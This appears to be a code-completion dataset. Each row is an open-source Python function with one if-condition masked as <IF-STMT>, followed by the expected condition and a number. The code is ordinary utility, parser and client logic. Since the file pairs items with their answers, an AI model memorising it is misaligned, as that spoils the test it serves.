1584,"def unpack(sources):<tab>temp_dir = tempfile.mkdtemp(""-scratchdir"", ""unpacker-"")<tab>for package, content in sources.items():<tab><tab>filepath = package.split(""/"")<tab><tab>dirpath = os.sep.join(filepath[:-1])<tab><tab>packagedir = os.path.join(temp_dir, dirpath)<tab><tab><IF-STMT><tab><tab><tab>os.makedirs(packagedir)<tab><tab>mod = open(os.path.join(packagedir, filepath[-1]), ""wb"")<tab><tab>try:<tab><tab><tab>mod.write(base64.b64decode(content))<tab><tab>finally:<tab><tab><tab>mod.close()<tab>return temp_dir",if not os . path . isdir ( packagedir ) :,165
1585,"def set_torrent_path(self, torrent_id, path):<tab>try:<tab><tab>if not self.connect():<tab><tab><tab>return False<tab><tab>self.client.core.set_torrent_move_completed_path(torrent_id, path).get()<tab><tab>self.client.core.set_torrent_move_completed(torrent_id, 1).get()<tab>except Exception:<tab><tab>return False<tab>finally:<tab><tab><IF-STMT><tab><tab><tab>self.disconnect()<tab>return True",if self . client :,123
1586,"def _get_specs(self, link, source, target):<tab>for src_spec, code in link.code.items():<tab><tab>src_specs = src_spec.split(""."")<tab><tab>if src_spec.startswith(""event:""):<tab><tab><tab>src_spec = (None, src_spec)<tab><tab><IF-STMT><tab><tab><tab>src_spec = (""."".join(src_specs[:-1]), src_specs[-1])<tab><tab>else:<tab><tab><tab>src_prop = src_specs[0]<tab><tab><tab>if isinstance(source, Reactive):<tab><tab><tab><tab>src_prop = source._rename.get(src_prop, src_prop)<tab><tab><tab>src_spec = (None, src_prop)<tab>return [(src_spec, (None, None), code)]",elif len ( src_specs ) > 1 :,190
1587,"def deserialize(self, meth, content_type, body):<tab>meth_deserializers = getattr(meth, ""wsgi_deserializers"", {})<tab>try:<tab><tab>mtype = _MEDIA_TYPE_MAP.get(content_type, content_type)<tab><tab><IF-STMT><tab><tab><tab>deserializer = meth_deserializers[mtype]<tab><tab>else:<tab><tab><tab>deserializer = self.default_deserializers[mtype]<tab>except (KeyError, TypeError):<tab><tab>raise exception.InvalidContentType(content_type=content_type)<tab>return deserializer().deserialize(body)",if mtype in meth_deserializers :,139
1588,"def object_inspect(self, oname, detail_level=0):<tab>""""""Get object info about oname""""""<tab>with self.builtin_trap:<tab><tab>info = self._object_find(oname)<tab><tab><IF-STMT><tab><tab><tab>return self.inspector.info(<tab><tab><tab><tab>info.obj, oname, info=info, detail_level=detail_level<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>return oinspect.object_info(name=oname, found=False)",if info . found :,122
1589,"def wrapper(*args, **kargs):<tab>for key, value in vkargs.items():<tab><tab><IF-STMT><tab><tab><tab>abort(403, ""Missing parameter: %s"" % key)<tab><tab>try:<tab><tab><tab>kargs[key] = value(kargs[key])<tab><tab>except ValueError:<tab><tab><tab>abort(403, ""Wrong parameter format for: %s"" % key)<tab>return func(*args, **kargs)",if key not in kargs :,105
1590,"def _append_fragment(self, ctx, frag_content):<tab>try:<tab><tab>ctx[""dest_stream""].write(frag_content)<tab><tab>ctx[""dest_stream""].flush()<tab>finally:<tab><tab>if self.__do_ytdl_file(ctx):<tab><tab><tab>self._write_ytdl_file(ctx)<tab><tab><IF-STMT><tab><tab><tab>os.remove(encodeFilename(ctx[""fragment_filename_sanitized""]))<tab><tab>del ctx[""fragment_filename_sanitized""]","if not self . params . get ( ""keep_fragments"" , False ) :",128
1591,"def override_args_required_option(argument_table, args, session, **kwargs):<tab># This function overrides the 'required' property of an argument<tab># if a value corresponding to that argument is present in the config<tab># file<tab># We don't want to override when user is viewing the help so that we<tab># can show the required options correctly in the help<tab>need_to_override = False if len(args) == 1 and args[0] == ""help"" else True<tab>if need_to_override:<tab><tab>parsed_configs = configutils.get_configs(session)<tab><tab>for arg_name in argument_table.keys():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>argument_table[arg_name].required = False","if arg_name . replace ( ""-"" , ""_"" ) in parsed_configs :",183
1592,"def _count(self, element, count=True):<tab>if not isinstance(element, six.string_types):<tab><tab>if self == element:<tab><tab><tab>return 1<tab>i = 0<tab>for child in self.children:<tab><tab># child is text content and element is also text content, then<tab><tab># make a simple ""text"" in ""text""<tab><tab>if isinstance(child, six.string_types):<tab><tab><tab>if isinstance(element, six.string_types):<tab><tab><tab><tab>if count:<tab><tab><tab><tab><tab>i += child.count(element)<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>return 1<tab><tab>else:<tab><tab><tab>i += child._count(element, count=count)<tab><tab><tab>if not count and i:<tab><tab><tab><tab>return i<tab>return i",elif element in child :,196
1593,"def teardown_class(cls):<tab>collections = cls.discovery.list_collections(cls.environment_id).get_result()[<tab><tab>""collections""<tab>]<tab>for collection in collections:<tab><tab><IF-STMT><tab><tab><tab>print(""Deleting the temporary collection"")<tab><tab><tab>cls.discovery.delete_collection(cls.environment_id, cls.collection_id)<tab><tab><tab>break","if collection [ ""name"" ] == cls . collection_name :",101
1594,"def _shares_in_results(data):<tab>shares_in_device, shares_in_subdevice = False, False<tab>for plugin_name, plugin_result in data.iteritems():<tab><tab>if plugin_result[""status""] == ""error"":<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if ""disk_shares"" in plugin_result[""device""]:<tab><tab><tab>shares_in_device = True<tab><tab>for subdevice in plugin_result[""device""].get(""subdevices"", []):<tab><tab><tab>if ""disk_shares"" in subdevice:<tab><tab><tab><tab>shares_in_subdevice = True<tab><tab><tab><tab>break<tab>return shares_in_device, shares_in_subdevice","if ""device"" not in plugin_result :",175
1595,"def accept_request(self, request):<tab>if self.restriction_type == BaseViewRestriction.PASSWORD:<tab><tab>passed_restrictions = request.session.get(<tab><tab><tab>self.passed_view_restrictions_session_key, []<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>return False<tab>elif self.restriction_type == BaseViewRestriction.LOGIN:<tab><tab>if not request.user.is_authenticated:<tab><tab><tab>return False<tab>elif self.restriction_type == BaseViewRestriction.GROUPS:<tab><tab>if not request.user.is_superuser:<tab><tab><tab>current_user_groups = request.user.groups.all()<tab><tab><tab>if not any(group in current_user_groups for group in self.groups.all()):<tab><tab><tab><tab>return False<tab>return True",if self . id not in passed_restrictions :,187
1596,"def __setitem__(self, index, item):<tab>try:<tab><tab>start, stop, step = index.start, index.stop, index.step<tab>except AttributeError:<tab><tab>index = operator.index(index)<tab>else:<tab><tab><IF-STMT><tab><tab><tab>self.lists[0][index] = item<tab><tab>else:<tab><tab><tab>tmp = list(self)<tab><tab><tab>tmp[index] = item<tab><tab><tab>self.lists[:] = [tmp]<tab><tab>self._balance_list(0)<tab><tab>return<tab>list_idx, rel_idx = self._translate_index(index)<tab>if list_idx is None:<tab><tab>raise IndexError()<tab>self.lists[list_idx][rel_idx] = item",if len ( self . lists ) == 1 :,183
1597,"def random_permutation_equality_groups(n_groups, n_perms_per_group, n_items, prob):<tab>fingerprints = set()<tab>for _ in range(n_groups):<tab><tab>perms = random_equal_permutations(n_perms_per_group, n_items, prob)<tab><tab>perm = perms[0]<tab><tab>fingerprint = tuple(perm.get(i, i) for i in range(n_items))<tab><tab><IF-STMT><tab><tab><tab>yield perms<tab><tab><tab>fingerprints.add(fingerprint)",if fingerprint not in fingerprints :,128
1598,"def get_proper_pip():  # no cov<tab>if not venv_active():<tab><tab>default_pip = os.environ.get(""_DEFAULT_PIP_"", None)<tab><tab><IF-STMT><tab><tab><tab>return default_pip<tab><tab>elif not ON_WINDOWS:<tab><tab><tab>return ""pip3""<tab>return ""pip""",if default_pip :,79
1599,"def close(self, checkcount=False):<tab>self.mutex.acquire()<tab>try:<tab><tab>if checkcount:<tab><tab><tab>self.openers -= 1<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.do_close()<tab><tab>else:<tab><tab><tab>if self.openers > 0:<tab><tab><tab><tab>self.do_close()<tab><tab><tab>self.openers = 0<tab>finally:<tab><tab>self.mutex.release()",if self . openers == 0 :,116
1600,"def _lxml_default_loader(href, parse, encoding=None, parser=None):<tab>if parse == ""xml"":<tab><tab>data = etree.parse(href, parser).getroot()<tab>else:<tab><tab><IF-STMT><tab><tab><tab>f = urlopen(href)<tab><tab>else:<tab><tab><tab>f = open(href, ""rb"")<tab><tab>data = f.read()<tab><tab>f.close()<tab><tab>if not encoding:<tab><tab><tab>encoding = ""utf-8""<tab><tab>data = data.decode(encoding)<tab>return data","if ""://"" in href :",133
1601,"def Save(self):<tab># Save the AUI perspectives if PersistenceManager allows it<tab>eventHandler = self._window.GetEventHandler()<tab>isAGWAui = isinstance(eventHandler, AUI.AuiManager)<tab>if not isAGWAui:<tab><tab>return True<tab>if self._manager.GetManagerStyle() & PM_SAVE_RESTORE_AUI_PERSPECTIVES:<tab><tab># Allowed to save and restore perspectives<tab><tab>perspective = eventHandler.SavePerspective()<tab><tab><IF-STMT><tab><tab><tab>name = PERSIST_AGW_AUI_PERSPECTIVE<tab><tab>else:<tab><tab><tab>name = PERSIST_AUI_PERSPECTIVE<tab><tab>self._pObject.SaveValue(name, perspective)<tab>return True",if isAGWAui :,186
1602,"def get_arg_list_scalar_arg_dtypes(arg_types):<tab>result = []<tab>for arg_type in arg_types:<tab><tab>if isinstance(arg_type, ScalarArg):<tab><tab><tab>result.append(arg_type.dtype)<tab><tab>elif isinstance(arg_type, VectorArg):<tab><tab><tab>result.append(None)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>result.append(np.int64)<tab><tab>else:<tab><tab><tab>raise RuntimeError(""arg type not understood: %s"" % type(arg_type))<tab>return result",if arg_type . with_offset :,142
1603,"def perform_secure_deletion_of_temporary_files(self):<tab># Delete the outdated temp files if older than 1 day<tab>for f in os.listdir(self.state.settings.tmp_path):<tab><tab>path = os.path.join(self.state.settings.tmp_path, f)<tab><tab>timestamp = datetime.fromtimestamp(os.path.getmtime(path))<tab><tab><IF-STMT><tab><tab><tab>overwrite_and_remove(path)","if is_expired ( timestamp , days = 1 ) :",114
1604,"def set_torrent_ratio(self, torrent_ids, ratio):<tab>try:<tab><tab><IF-STMT><tab><tab><tab>return False<tab><tab>self.client.core.set_torrent_stop_at_ratio(torrent_ids, True).get()<tab><tab>self.client.core.set_torrent_stop_ratio(torrent_ids, ratio).get()<tab>except Exception as err:<tab><tab>return False<tab>finally:<tab><tab>if self.client:<tab><tab><tab>self.disconnect()<tab>return True",if not self . connect ( ) :,125
1605,"def value_to_db_datetime(self, value):<tab>if value is None:<tab><tab>return None<tab># MySQL doesn't support tz-aware datetimes<tab>if timezone.is_aware(value):<tab><tab><IF-STMT><tab><tab><tab>value = value.astimezone(timezone.utc).replace(tzinfo=None)<tab><tab>else:<tab><tab><tab>raise ValueError(<tab><tab><tab><tab>""MySQL backend does not support timezone-aware datetimes when USE_TZ is False.""<tab><tab><tab>)<tab># MySQL doesn't support microseconds<tab>return six.text_type(value.replace(microsecond=0))",if settings . USE_TZ :,145
1606,"def remote_run_capture_all(login, cmd, log=None):<tab>""""""Run the remote command and return the (retval, stdout, stderr) result.""""""<tab>if sys.platform == ""win32"":<tab><tab><IF-STMT><tab><tab><tab>login = ""%s@%s"" % (getpass.getuser(), login)<tab><tab>cmd = 'plink -A -batch %s ""%s""' % (login, cmd)<tab>else:<tab><tab>cmd = 'ssh -A -o BatchMode=yes %s ""%s""' % (login, cmd)<tab>__run_log(logstream, ""running '%s'"", cmd)<tab>p = subprocess.Popen(argv, stdout=subprocess.PIPE, stderr=subprocess.PIPE)<tab>stdout, stderr = p.communicate()<tab>status = p.returncode<tab>return status, stdout, stderr","if ""@"" not in login :",193
1607,"def parseLeftHandSideExpressionAllowCall():<tab>marker = None<tab>expr = None<tab>args = None<tab>property = None<tab>marker = createLocationMarker()<tab>expr = parseNewExpression() if matchKeyword(""new"") else parsePrimaryExpression()<tab>while (match(""."") or match(""["")) or match(""(""):<tab><tab><IF-STMT><tab><tab><tab>args = parseArguments()<tab><tab><tab>expr = delegate.createCallExpression(expr, args)<tab><tab>elif match(""[""):<tab><tab><tab>property = parseComputedMember()<tab><tab><tab>expr = delegate.createMemberExpression(""["", expr, property)<tab><tab>else:<tab><tab><tab>property = parseNonComputedMember()<tab><tab><tab>expr = delegate.createMemberExpression(""."", expr, property)<tab><tab>if marker:<tab><tab><tab>marker.end()<tab><tab><tab>marker.apply(expr)<tab>return expr","if match ( ""("" ) :",193
1608,"def getImageId(self, stuff):<tab>if not isinstance(stuff, Module):<tab><tab>return -1<tab>if stuff.charge is None:<tab><tab>return -1<tab>else:<tab><tab>iconFile = stuff.charge.iconID if stuff.charge.iconID else """"<tab><tab><IF-STMT><tab><tab><tab>return self.fittingView.imageList.GetImageIndex(iconFile, ""icons"")<tab><tab>else:<tab><tab><tab>return -1",if iconFile :,108
1609,"def instance_reader():<tab>for epoch_index in range(epoch):<tab><tab>if shuffle:<tab><tab><tab>if shuffle_seed is not None:<tab><tab><tab><tab>np.random.seed(shuffle_seed)<tab><tab><tab>np.random.shuffle(examples)<tab><tab><IF-STMT><tab><tab><tab>self.current_train_epoch = epoch_index<tab><tab>for (index, example) in enumerate(examples):<tab><tab><tab>if phase == ""train"":<tab><tab><tab><tab>self.current_train_example = index + 1<tab><tab><tab>feature = self.convert_example(<tab><tab><tab><tab>index, example, self.get_labels(), self.max_seq_len, self.tokenizer<tab><tab><tab>)<tab><tab><tab>instance = self.generate_instance(feature)<tab><tab><tab>yield instance","if phase == ""train"" :",189
1610,"def i2h(self, pkt, x):<tab>if x is not None:<tab><tab><IF-STMT><tab><tab><tab>warning(""Fixed3_6: Internal value too negative: %d"" % x)<tab><tab><tab>x = 0<tab><tab>elif x > 999999999:<tab><tab><tab>warning(""Fixed3_6: Internal value too positive: %d"" % x)<tab><tab><tab>x = 999999999<tab><tab>x = x * 1e-6<tab>return x",if x < 0 :,111
1611,"def _is_section_header(self) -> bool:<tab>section, underline = self._line_iter.peek(2)<tab>section = section.lower()<tab>if section in self._sections and isinstance(underline, str):<tab><tab>return bool(_numpy_section_regex.match(underline))<tab>elif self._directive_sections:<tab><tab><IF-STMT><tab><tab><tab>for directive_section in self._directive_sections:<tab><tab><tab><tab>if section.startswith(directive_section):<tab><tab><tab><tab><tab>return True<tab>return False",if _directive_regex . match ( section ) :,132
1612,"def _parse_date_fmt():<tab>fmt = get_format(""DATE_FORMAT"")<tab>escaped = False<tab>for char in fmt:<tab><tab>if escaped:<tab><tab><tab>escaped = False<tab><tab>elif char == ""\\"":<tab><tab><tab>escaped = True<tab><tab>elif char in ""Yy"":<tab><tab><tab>yield ""year""<tab><tab>elif char in ""bEFMmNn"":<tab><tab><tab>yield ""month""<tab><tab><IF-STMT><tab><tab><tab>yield ""day""","elif char in ""dj"" :",117
1613,"def _wait_port_open(port, max_wait=60):<tab>print(f""Waiting for port {port}"")<tab>start = time.time()<tab>while True:<tab><tab>try:<tab><tab><tab>socket.create_connection((""localhost"", port), timeout=1)<tab><tab>except OSError:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise<tab><tab><tab>time.sleep(1)<tab><tab>else:<tab><tab><tab>return",if time . time ( ) - start > max_wait :,113
1614,"def _list(self):<tab>data_sources = self.mkt_contract.functions.getAllProviders().call()<tab>data = []<tab>for index, data_source in enumerate(data_sources):<tab><tab>if index > 0:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>data.append(dict(dataset=self.to_text(data_source)))<tab>return pd.DataFrame(data)","if ""test"" not in Web3 . toText ( data_source ) . lower ( ) :",111
1615,"def log_start(self, prefix, msg):<tab>with self._log_lock:<tab><tab>if self._last_log_prefix != prefix:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._log_file.write(""\n"")<tab><tab><tab>self._log_file.write(prefix)<tab><tab>self._log_file.write(msg)<tab><tab>self._last_log_prefix = prefix",if self . _last_log_prefix is not None :,105
1616,"def _split_string_to_tokens(text):<tab>""""""Splits text to a list of string tokens.""""""<tab>if not text:<tab><tab>return []<tab>ret = []<tab>token_start = 0<tab># Classify each character in the input string<tab>is_alnum = [c in _ALPHANUMERIC_CHAR_SET for c in text]<tab>for pos in xrange(1, len(text)):<tab><tab>if is_alnum[pos] != is_alnum[pos - 1]:<tab><tab><tab>token = text[token_start:pos]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>ret.append(token)<tab><tab><tab>token_start = pos<tab>final_token = text[token_start:]<tab>ret.append(final_token)<tab>return ret","if token != u"" "" or token_start == 0 :",191
1617,"def _install_groups(self, grp_specs):<tab>try:<tab><tab>self.base.env_group_install(<tab><tab><tab>grp_specs,<tab><tab><tab>tuple(self.base.conf.group_package_types),<tab><tab><tab>strict=self.base.conf.strict,<tab><tab>)<tab>except dnf.exceptions.Error:<tab><tab><IF-STMT><tab><tab><tab>raise",if self . base . conf . strict :,100
1618,def _idx2token(idxs):<tab>for idx in idxs:<tab><tab>if idx < self.tgt_vocab_size:<tab><tab><tab>token = self.tgt_vocab([[idx]])[0][0]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab><tab>yield token<tab><tab>else:<tab><tab><tab>yield self.kb_keys[idx - self.tgt_vocab_size],if token == self . eos_token :,99
1619,"def increment(s):<tab>if not s:<tab><tab>return ""1""<tab>for sequence in string.digits, string.lowercase, string.uppercase:<tab><tab>lastc = s[-1]<tab><tab>if lastc in sequence:<tab><tab><tab>i = sequence.index(lastc) + 1<tab><tab><tab>if i >= len(sequence):<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>s = sequence[0] * 2<tab><tab><tab><tab><tab>if s == ""00"":<tab><tab><tab><tab><tab><tab>s = ""10""<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>s = increment(s[:-1]) + sequence[0]<tab><tab><tab>else:<tab><tab><tab><tab>s = s[:-1] + sequence[i]<tab><tab><tab>return s<tab>return s  # Don't increment",if len ( s ) == 1 :,196
1620,"def main():<tab>import sys, getopt<tab>try:<tab><tab>opts, args = getopt.getopt(sys.argv[1:], ""ho:"", [""help"", ""output=""])<tab>except getopt.GetoptError as err:<tab><tab>usage()<tab><tab>sys.exit(1)<tab>output = None<tab>for o, a in opts:<tab><tab>if o in (""-h"", ""--help""):<tab><tab><tab>usage()<tab><tab><tab>sys.exit()<tab><tab><IF-STMT><tab><tab><tab>output = a<tab><tab>else:<tab><tab><tab>usage()<tab><tab><tab>sys.exit(1)<tab>if not args:<tab><tab>usage()<tab><tab>sys.exit(1)<tab>concat_flv(args, output)","elif o in ( ""-o"" , ""--output"" ) :",175
1621,def binaryFindInDocument():<tab>hi = len(self.headings)<tab>lo = 0<tab>while lo < hi:<tab><tab>mid = (lo + hi) // 2<tab><tab>h = self.headings[mid]<tab><tab><IF-STMT><tab><tab><tab>lo = mid + 1<tab><tab>elif h.start > position:<tab><tab><tab>hi = mid<tab><tab>else:<tab><tab><tab>return binaryFindHeading(h),if h . end_of_last_child < position :,110
1622,"def on_key_press(self, *events):<tab># The JS editor has already** handled the key!<tab>for ev in events:<tab><tab><IF-STMT><tab><tab><tab>ivar = ""minibufferWidget"" if self.name == ""minibuffer"" else self.name<tab><tab><tab>self.root.do_key(ev, ivar)",if self . should_be_leo_key ( ev ) :,91
1623,"def _make_dataset(data_dir):<tab>data_dir = os.path.expanduser(data_dir)<tab>if not os.path.isdir(data_dir):<tab><tab>raise (""{} should be a dir"".format(data_dir))<tab>images = []<tab>for root, _, fnames in sorted(os.walk(data_dir, followlinks=True)):<tab><tab>for fname in sorted(fnames):<tab><tab><tab>file_path = os.path.join(root, fname)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>images.append(file_path)<tab>return images",if _is_valid_file ( file_path ) :,146
1624,"def release(provider, connection, cache=None):<tab>if cache is not None:<tab><tab>db_session = cache.db_session<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>cursor = connection.cursor()<tab><tab><tab><tab>sql = ""SET foreign_key_checks = 1""<tab><tab><tab><tab>if core.local.debug:<tab><tab><tab><tab><tab>log_orm(sql)<tab><tab><tab><tab>cursor.execute(sql)<tab><tab><tab>except:<tab><tab><tab><tab>provider.pool.drop(connection)<tab><tab><tab><tab>raise<tab>DBAPIProvider.release(provider, connection, cache)",if db_session is not None and db_session . ddl and cache . saved_fk_state :,164
1625,"def get_pfunctions(self):<tab>p_functions = []<tab>for name, item in self.pdict.items():<tab><tab>if name[:2] != ""p_"":<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if isinstance(item, (types.FunctionType, types.MethodType)):<tab><tab><tab>line = func_code(item).co_firstlineno<tab><tab><tab>file = func_code(item).co_filename<tab><tab><tab>p_functions.append((line, file, name, item.__doc__))<tab># Sort all of the actions by line number<tab>p_functions.sort()<tab>self.pfuncs = p_functions","if name == ""p_error"" :",158
1626,"def get_output_sizes(self):<tab>sizes = []<tab>output_paths = self.get_output_fnames()<tab>for outfile in [unicodify(o) for o in output_paths]:<tab><tab><IF-STMT><tab><tab><tab>sizes.append((outfile, os.stat(outfile).st_size))<tab><tab>else:<tab><tab><tab>sizes.append((outfile, 0))<tab>return sizes",if os . path . exists ( outfile ) :,100
1627,"def normalize_crlf(tree):<tab>for elem in tree.getiterator():<tab><tab><IF-STMT><tab><tab><tab>elem.text = elem.text.replace(""\r\n"", ""\n"")<tab><tab>if elem.tail:<tab><tab><tab>elem.tail = elem.tail.replace(""\r\n"", ""\n"")",if elem . text :,76
1628,"def visit_decorator(self, o: Decorator) -> None:<tab>if self.is_private_name(o.func.name, o.func.fullname):<tab><tab>return<tab>is_abstract = False<tab>for decorator in o.original_decorators:<tab><tab><IF-STMT><tab><tab><tab>if self.process_name_expr_decorator(decorator, o):<tab><tab><tab><tab>is_abstract = True<tab><tab>elif isinstance(decorator, MemberExpr):<tab><tab><tab>if self.process_member_expr_decorator(decorator, o):<tab><tab><tab><tab>is_abstract = True<tab>self.visit_func_def(o.func, is_abstract=is_abstract)","if isinstance ( decorator , NameExpr ) :",160
1629,"def formatweekday(self, day, width):<tab>with TimeEncoding(self.locale) as encoding:<tab><tab><IF-STMT><tab><tab><tab>names = day_name<tab><tab>else:<tab><tab><tab>names = day_abbr<tab><tab>name = names[day]<tab><tab>if encoding is not None:<tab><tab><tab>name = name.decode(encoding)<tab><tab>return name[:width].center(width)",if width >= 9 :,97
1630,"def autocommitter():<tab>while True:<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab><tab>if self._auto_commit_enable:<tab><tab><tab><tab>self._auto_commit()<tab><tab><tab>self._cluster.handler.sleep(self._auto_commit_interval_ms / 1000)<tab><tab>except ReferenceError:<tab><tab><tab>break<tab><tab>except Exception:<tab><tab><tab># surface all exceptions to the main thread<tab><tab><tab>self._worker_exception = sys.exc_info()<tab><tab><tab>break<tab>log.debug(""Autocommitter thread exiting"")",if not self . _running :,141
1631,"def pseudo_raw_input(self, prompt):<tab>""""""copied from cmd's cmdloop; like raw_input, but accounts for changed stdin, stdout""""""<tab>if self.use_rawinput:<tab><tab>try:<tab><tab><tab>line = raw_input(prompt)<tab><tab>except EOFError:<tab><tab><tab>line = ""EOF""<tab>else:<tab><tab>self.stdout.write(prompt)<tab><tab>self.stdout.flush()<tab><tab>line = self.stdin.readline()<tab><tab>if not len(line):<tab><tab><tab>line = ""EOF""<tab><tab>else:<tab><tab><tab><IF-STMT>  # this was always true in Cmd<tab><tab><tab><tab>line = line[:-1]<tab>return line","if line [ - 1 ] == ""\n"" :",172
1632,"def get_suggestion(self, suggestion):<tab>if suggestion is None:<tab><tab>return suggestion<tab>counter = 0<tab>results = []<tab>for feature in self._features:<tab><tab>if feature in self._discrete_features:<tab><tab><tab>result, counter = self._get_discrete_suggestion(<tab><tab><tab><tab>feature=feature, suggestion=suggestion, counter=counter<tab><tab><tab>)<tab><tab><tab>results.append(result)<tab><tab><IF-STMT><tab><tab><tab>result, counter = self._get_categorical_suggestion(<tab><tab><tab><tab>feature=feature, suggestion=suggestion, counter=counter<tab><tab><tab>)<tab><tab><tab>results.append(result)<tab><tab>else:<tab><tab><tab>results.append(suggestion[counter])<tab><tab><tab>counter = counter + 1<tab>return dict(zip(self._features, results))",elif feature in self . _categorical_features :,198
1633,"def gen_raw_options(modelines):<tab>for m in modelines:<tab><tab>opt = m.partition("":"")[2].strip()<tab><tab><IF-STMT><tab><tab><tab>for subopt in (s for s in opt.split(MULTIOPT_SEP)):<tab><tab><tab><tab>yield subopt<tab><tab>else:<tab><tab><tab>yield opt",if MULTIOPT_SEP in opt :,84
1634,"def _parse_chunked(self, data):<tab>body = []<tab>trailers = {}<tab>n = 0<tab>lines = data.split(b""\r\n"")<tab># parse body<tab>while True:<tab><tab>size, chunk = lines[n : n + 2]<tab><tab>size = int(size, 16)<tab><tab>if size == 0:<tab><tab><tab>n += 1<tab><tab><tab>break<tab><tab>self.assertEqual(size, len(chunk))<tab><tab>body.append(chunk)<tab><tab>n += 2<tab><tab># we /should/ hit the end chunk, but check against the size of<tab><tab># lines so we're not stuck in an infinite loop should we get<tab><tab># malformed data<tab><tab><IF-STMT><tab><tab><tab>break<tab>return b"""".join(body)",if n > len ( lines ) :,191
1635,"def join(s, *p):<tab>path = s<tab>for t in p:<tab><tab><IF-STMT><tab><tab><tab>path = t<tab><tab><tab>continue<tab><tab>if t[:1] == "":"":<tab><tab><tab>t = t[1:]<tab><tab>if "":"" not in path:<tab><tab><tab>path = "":"" + path<tab><tab>if path[-1:] != "":"":<tab><tab><tab>path = path + "":""<tab><tab>path = path + t<tab>return path",if ( not s ) or isabs ( t ) :,115
1636,"def validate_route_filter(cmd, namespace):<tab>from msrestazure.tools import is_valid_resource_id, resource_id<tab>if namespace.route_filter:<tab><tab><IF-STMT><tab><tab><tab>namespace.route_filter = resource_id(<tab><tab><tab><tab>subscription=get_subscription_id(cmd.cli_ctx),<tab><tab><tab><tab>resource_group=namespace.resource_group_name,<tab><tab><tab><tab>namespace=""Microsoft.Network"",<tab><tab><tab><tab>type=""routeFilters"",<tab><tab><tab><tab>name=namespace.route_filter,<tab><tab><tab>)",if not is_valid_resource_id ( namespace . route_filter ) :,152
1637,"def expanded_output(self):<tab>""""""Iterate over output files while dynamic output is expanded.""""""<tab>for f, f_ in zip(self.output, self.rule.output):<tab><tab>if f in self.dynamic_output:<tab><tab><tab>expansion = self.expand_dynamic(f_)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>yield f_<tab><tab><tab>for f, _ in expansion:<tab><tab><tab><tab>file_to_yield = IOFile(f, self.rule)<tab><tab><tab><tab>file_to_yield.clone_flags(f_)<tab><tab><tab><tab>yield file_to_yield<tab><tab>else:<tab><tab><tab>yield f",if not expansion :,153
1638,"def prepare_text(text, style):<tab>body = []<tab>for fragment, sty in parse_tags(text, style, subs.styles):<tab><tab>fragment = fragment.replace(r""\h"", "" "")<tab><tab>fragment = fragment.replace(r""\n"", ""\n"")<tab><tab>fragment = fragment.replace(r""\N"", ""\n"")<tab><tab>if sty.italic:<tab><tab><tab>fragment = ""<i>%s</i>"" % fragment<tab><tab>if sty.underline:<tab><tab><tab>fragment = ""<u>%s</u>"" % fragment<tab><tab>if sty.strikeout:<tab><tab><tab>fragment = ""<s>%s</s>"" % fragment<tab><tab><IF-STMT><tab><tab><tab>raise ContentNotUsable<tab><tab>body.append(fragment)<tab>return re.sub(""\n+"", ""\n"", """".join(body).strip())",if sty . drawing :,198
1639,"def decref(self, key, count=1):<tab>with self._lock:<tab><tab>slot = self._dict[key]<tab><tab><IF-STMT><tab><tab><tab>del self._dict[key]<tab><tab>else:<tab><tab><tab>slot[1] -= count<tab><tab><tab>self._dict[key] = slot",if slot [ 1 ] < count :,79
1640,"def stale_rec(node, nodes):<tab>if node.abspath() in node.ctx.env[Build.CFG_FILES]:<tab><tab>return<tab>if getattr(node, ""children"", []):<tab><tab>for x in node.children.values():<tab><tab><tab>if x.name != ""c4che"":<tab><tab><tab><tab>stale_rec(x, nodes)<tab>else:<tab><tab>for ext in DYNAMIC_EXT:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab>else:<tab><tab><tab>if not node in nodes:<tab><tab><tab><tab>if can_delete(node):<tab><tab><tab><tab><tab>Logs.warn(""Removing stale file -> %r"", node)<tab><tab><tab><tab><tab>node.delete()",if node . name . endswith ( ext ) :,177
1641,"def _do_ssl_handshake(self):<tab>try:<tab><tab>self.socket.do_handshake()<tab>except ssl.SSLError as err:<tab><tab>if err.args[0] in (ssl.SSL_ERROR_WANT_READ, ssl.SSL_ERROR_WANT_WRITE):<tab><tab><tab>return<tab><tab>elif err.args[0] == ssl.SSL_ERROR_EOF:<tab><tab><tab>return self.handle_close()<tab><tab>raise<tab>except OSError as err:<tab><tab><IF-STMT><tab><tab><tab>return self.handle_close()<tab>else:<tab><tab>self._ssl_accepting = False",if err . args [ 0 ] == errno . ECONNABORTED :,161
1642,"def test_full_hd_tv(self):<tab>cur_test = ""full_hd_tv""<tab>cur_qual = common.Quality.FULLHDTV<tab>for name, tests in iteritems(self.test_cases):<tab><tab>for test in tests:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.assertEqual(cur_qual, common.Quality.name_quality(test))<tab><tab><tab>else:<tab><tab><tab><tab>self.assertNotEqual(cur_qual, common.Quality.name_quality(test))",if name == cur_test :,130
1643,"def debug_tree(tree):<tab>l = []<tab>for elt in tree:<tab><tab>if isinstance(elt, int):<tab><tab><tab>l.append(_names.get(elt, elt))<tab><tab><IF-STMT><tab><tab><tab>l.append(elt)<tab><tab>else:<tab><tab><tab>l.append(debug_tree(elt))<tab>return l","elif isinstance ( elt , str ) :",89
